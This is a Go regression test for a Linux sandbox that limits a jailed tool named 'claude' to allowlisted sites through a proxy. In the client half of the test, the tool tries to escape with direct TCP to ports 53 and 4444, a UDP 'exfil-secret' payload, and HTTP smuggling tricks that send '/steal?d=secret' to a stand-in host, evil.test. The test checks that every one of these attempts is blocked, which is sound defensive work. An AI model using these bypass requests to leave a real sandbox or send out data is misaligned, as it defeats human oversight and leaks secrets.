//go:build jail && linux

package jail

// Regression test from the independent review (a second network namespace, so the tool really
// leaves the machine): what a jailed tool can and cannot reach.

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/netip"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
)

const far = "10.99.0.2"

// escHelper runs the server or client half when the test binary was started for it.
func escHelper() bool {
	switch os.Getenv("ESC") {
	case "serve": // runs inside the "far" netns
		for _, p := range []string{"53", "80", "4444"} {
			ln, err := net.Listen("tcp", ":"+p)
			if err != nil {
				panic(err)
			}
			go func(p string) {
				for {
					c, err := ln.Accept()
					if err != nil {
						return
					}
					go func() {
						defer c.Close()
						if p != "80" {
							fmt.Fprintf(c, "DIRECT-%s\n", p)
							return
						}
						br := bufio.NewReader(c)
						for {
							line, err := br.ReadString('\n')
							if err != nil {
								return
							}
							host := ""
							for {
								h, err := br.ReadString('\n')
								if err != nil || h == "\r\n" {
									break
								}
								if strings.HasPrefix(strings.ToLower(h), "host:") {
									host = strings.TrimSpace(h[5:])
								}
							}
							body := "served " + host + " for " + strings.TrimSpace(line)
							fmt.Fprintf(c, "HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s", len(body), body)
						}
					}()
				}
			}(p)
		}
		u, err := net.ListenPacket("udp", ":53")
		if err != nil {
			panic(err)
		}
		go func() {
			b := make([]byte, 2048)
			for {
				n, a, err := u.ReadFrom(b)
				if err != nil {
					return
				}
				u.WriteTo(append([]byte("UDP-ECHO "), b[:n]...), a)
			}
		}()
		select {}
	case "client": // runs as the jailed "claude"
		time.Sleep(1500 * time.Millisecond)
		try := func(name string, f func() string) { fmt.Printf("%s => %q\n", name, f()) }
		try("tcp far:53", func() string {
			c, err := net.DialTimeout("tcp", far+":53", 3*time.Second)
			if err != nil {
				return "ERR " + err.Error()
			}
			defer c.Close()
			c.SetDeadline(time.Now().Add(3 * time.Second))
			b, _ := io.ReadAll(c)
			return string(b)
		})
		try("tcp far:4444", func() string {
			c, err := net.DialTimeout("tcp", far+":4444", 3*time.Second)
			if err != nil {
				return "ERR " + err.Error()
			}
			defer c.Close()
			c.SetDeadline(time.Now().Add(3 * time.Second))
			b, _ := io.ReadAll(c)
			return string(b)
		})
		try("udp far:53 (arbitrary payload)", func() string {
			c, err := net.Dial("udp", far+":53")
			if err != nil {
				return "ERR " + err.Error()
			}
			defer c.Close()
			c.SetDeadline(time.Now().Add(3 * time.Second))
			c.Write([]byte("exfil-secret"))
			b := make([]byte, 100)
			n, err := c.Read(b)
			if err != nil {
				return "ERR " + err.Error()
			}
			return string(b[:n])
		})
		http := func(reqs string) string {
			c, err := net.DialTimeout("tcp", far+":80", 3*time.Second)
			if err != nil {
				return "ERR " + err.Error()
			}
			defer c.Close()
			c.SetDeadline(time.Now().Add(4 * time.Second))
			io.WriteString(c, reqs)
			b, _ := io.ReadAll(c)
			return string(b)
		}
		try("allowed.test through the proxy", func() string {
			return http("GET /ok HTTP/1.1\r\nHost: allowed.test\r\nConnection: close\r\n\r\n")
		})
		try("keep-alive: 2nd request Host evil.test after allowed.test", func() string {
			return http("GET /a HTTP/1.1\r\nHost: allowed.test\r\n\r\nGET /steal?d=secret HTTP/1.1\r\nHost: evil.test\r\n\r\n")
		})
		try("absolute-form to a 'builtin' address", func() string {
			return http("GET http://evil.test/steal?d=secret HTTP/1.1\r\nHost: evil.test\r\n\r\n")
		})
		try("lowercase method to a 'builtin' address", func() string {
			return http("get /steal HTTP/1.1\r\nHost: evil.test\r\n\r\n")
		})
		os.Exit(0)
	}
	return false
}

func run(t *testing.T, args ...string) {
	if out, err := exec.Command(args[0], args[1:]...).CombinedOutput(); err != nil {
		t.Fatalf("%v: %v %s", args, err, out)
	}
}

func TestJailedToolReachesOnlyWhatItMay(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root")
	}
	exec.Command("ip", "netns", "del", "far").Run()
	exec.Command("ip", "link", "del", "v0").Run()
	run(t, "ip", "netns", "add", "far")
	defer exec.Command("ip", "netns", "del", "far").Run()
	defer exec.Command("ip", "link", "del", "v0").Run()
	run(t, "ip", "link", "add", "v0", "type", "veth", "peer", "name", "v1")
	run(t, "ip", "link", "set", "v1", "netns", "far")
	run(t, "ip", "addr", "add", "10.99.0.1/24", "dev", "v0")
	run(t, "ip", "link", "set", "v0", "up")
	run(t, "ip", "netns", "exec", "far", "ip", "addr", "add", far+"/24", "dev", "v1")
	run(t, "ip", "netns", "exec", "far", "ip", "link", "set", "v1", "up")
	run(t, "ip", "netns", "exec", "far", "ip", "link", "set", "lo", "up")
	srv := exec.Command("ip", "netns", "exec", "far", os.Args[0])
	srv.Env = append(os.Environ(), "ESC=serve")
	if err := srv.Start(); err != nil {
		t.Fatal(err)
	}
	defer srv.Process.Kill()
	time.Sleep(500 * time.Millisecond)

	dir, _ := os.MkdirTemp("", "esc")
	os.Chmod(dir, 0o755)
	self, _ := os.ReadFile(os.Args[0])
	os.WriteFile(filepath.Join(dir, "claude"), self, 0o755)

	log.SetOutput(os.Stdout)
	pol := NewPolicy()
	pol.SetRules([]Rule{{Tool: claude, Site: "allowed.test", Mode: "ALLOW"}})
	// The built-in names resolve to far (stands in for a shared CDN address, e.g. npm on Cloudflare).
	pol.lookup = func(context.Context, string) ([]netip.Addr, error) {
		return []netip.Addr{netip.MustParseAddr(far)}, nil
	}
	e := newEnforcer()
	r := &runner{pf: e, policy: pol, asker: &fakeAsker{res: Result{Reason: "denied"}}, running: map[string]*toolProxy{},
		resolve: func(context.Context, string) ([]netip.Addr, error) {
			return []netip.Addr{netip.MustParseAddr(far)}, nil
		}}
	tp, err := r.startProxy(claude)
	if err != nil {
		t.Fatal(err)
	}
	defer tp.close()
	if err := e.Apply(map[string]int{claude: tp.port}); err != nil {
		t.Fatal(err)
	}
	defer e.Teardown()
	cmd := exec.Command(filepath.Join(dir, "claude"))
	cmd.Env = append(os.Environ(), "ESC=client")
	cmd.SysProcAttr = &syscall.SysProcAttr{Credential: &syscall.Credential{Uid: 1000, Gid: 1000}}
	out, _ := cmd.CombinedOutput()
	got := string(out)
	t.Logf("\n%s", got)
	line := func(name string) string {
		for _, l := range strings.Split(got, "\n") {
			if strings.HasPrefix(l, name+" =>") {
				return l
			}
		}
		t.Fatalf("no result for %q in:\n%s", name, got)
		return ""
	}
	// The tool still reaches the world through the proxy: the packet leaves on the real interface
	// after the redirect, which an "oifname lo" rule would have reset.
	if l := line("allowed.test through the proxy"); !strings.Contains(l, "served allowed.test for GET /ok") {
		t.Errorf("the allowed site was not reachable: %s", l)
	}
	for _, name := range []string{"tcp far:53", "tcp far:4444", "udp far:53 (arbitrary payload)"} {
		if l := line(name); strings.Contains(l, "DIRECT") || strings.Contains(l, "UDP-ECHO") {
			t.Errorf("escaped: %s", l)
		}
	}
	// Nothing ever reaches a site that was not allowed, whatever the request looks like.
	if strings.Contains(got, "served evil.test") {
		t.Errorf("a request for evil.test was served:\n%s", got)
	}
}
